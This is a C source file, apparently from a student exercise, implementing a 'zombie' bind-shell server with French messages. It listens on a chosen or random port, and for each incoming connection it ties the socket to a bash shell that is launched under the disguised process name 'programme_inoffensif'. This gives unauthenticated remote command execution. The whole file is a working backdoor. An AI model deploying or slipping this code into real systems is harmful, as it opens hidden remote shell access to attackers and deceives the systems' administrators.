#include <string.h>
#include <ctype.h>
#include <libgen.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdio.h>
#include <signal.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <time.h>

#include "utils_v2.h"
#include "header.h"

#define BACKLOG 5
#define BUFFER_SIZE 5000
#define SERVER_PORT 5000

pid_t childId; 

//The child process who launchs the shell bash.
void executeCommand(void* fd) {
    
    int newFd = *(int *) fd;

    dup2(newFd,1);
    dup2(newFd,0);
    dup2(newFd,2);

  	execlp("bash", "programme_inoffensif", NULL);
}

void handleSIGINT(int signal) {
    printf("Le zombie est terminé.\n ");
    skill(0, SIGINT);
    exit(0);
}

int initSocketServer(int serverPort) {
    int sockfd = ssocket();
    int option = 1;
    setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(int));
    sbind(serverPort, sockfd);
    slisten(sockfd, BACKLOG);
    return sockfd;
}

int main(int argc, char** argv) {
    int sockfd;
    int port;

    ssigaction(SIGINT, handleSIGINT);  

    if (argc > 1) {
        int port = atoi(argv[1]);
        sockfd = initSocketServer(port);
        printf("Le serveur tourne sur le port : %i\n", port);
    } else {
        // Select a random port from the list of available ports
        srand(time(NULL));
        int index = rand() % NUM_PORTS;
        port = PORTS[index];
        sockfd = initSocketServer(port);
        printf("Le serveur tourne sur le port : %i\n", port);
    }
    int newsockfd;

    while(1){
      newsockfd = saccept(sockfd);
      childId = fork_and_run1(executeCommand, &newsockfd);
      int statut;
      swaitpid(childId, &statut,0);
    }

    /* Close the client connection */
    sclose(newsockfd);
    /* Close the socket */
    sclose(sockfd);
}


